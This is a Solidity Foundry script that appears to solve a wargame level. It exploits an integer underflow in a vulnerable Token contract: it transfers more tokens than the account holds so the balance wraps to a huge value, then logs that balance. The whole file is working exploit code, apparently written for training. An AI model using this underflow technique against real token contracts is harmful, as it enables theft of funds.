// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Token} from "../src/Token.sol";
import {Script, console} from "../lib/forge-std/src/Script.sol";

contract TokenSolution is Script {
    Token public token = Token(0xAa12F8247dade12965F4aD257Eade90c7dE6C31e);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        token.transfer(address(0), 21);
        console.log("Account Balance: ", token.balanceOf(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
    }
}
